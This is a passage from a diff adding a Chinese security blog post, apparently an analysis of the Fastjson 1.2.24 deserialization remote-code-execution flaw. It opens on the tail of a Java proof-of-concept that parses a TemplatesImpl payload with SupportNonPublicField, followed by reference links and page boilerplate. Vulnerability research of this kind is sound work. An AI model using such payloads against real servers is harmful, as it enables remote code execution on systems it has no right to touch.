class="string">"\"_outputProperties\":&#123; &#125;\n"</span> +</span><br><span class="line">                <span class="string">"&#125;"</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(poc);</span><br><span class="line"></span><br><span class="line">        JSON.parse(poc,Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/cyeEAv31GO_hZCTXVRBkxw" target="_blank" rel="noopener">深入理解JNDI注入与Java反序列化漏洞利用</a></p>
+<p><a href="https://www.freebuf.com/vuls/178012.html" target="_blank" rel="noopener">Fastjson 1.2.24反序列化漏洞分析</a></p>
+<p><a href="https://xz.aliyun.com/t/7027" target="_blank" rel="noopener">JAVA反序列化 - FastJson组件</a></p>
+<p><a href="https://vulhub.org/#/environments/fastjson/1.2.24-rce/" target="_blank" rel="noopener">fastjson 1.2.24 反序列化导致任意命令执行漏洞</a></p>
+<p><a href="https://paper.seebug.org/942/" target="_blank" rel="noopener">如何绕过高版本 JDK 的限制进行 JNDI 注入利用</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/FastJson/" rel="tag"># FastJson</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+              <a href="/tags/JNDI%E6%B3%A8%E5%85%A5/" rel="tag"># JNDI注入</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/" rel="prev" title="JDK7u21反序列化Gadgets">
+      <i class="fa fa-chevron-left"></i> JDK7u21反序列化Gadgets
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JdbcRowSetImpl-JNDI-Reference-Payload"><span class="nav-number">3.</span> <span class="nav-text">JdbcRowSetImpl+JNDI Reference Payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TemplatesImpl"><span class="nav-number">4.</span> <span class="nav-text">TemplatesImpl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">淚笑</p>
+  <div class="site-description" itemprop="description">不忘初心,方得始终</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">淚笑</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.1
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : true,
+      notify     : false,
+      appId      : 'qwTJhbxxQO8aSbrgx4Bv1MuN-gzGzoHsz',
+      appKey     : '3xcdH0gTNuTi8B0JqFAFD9SD',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : true,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
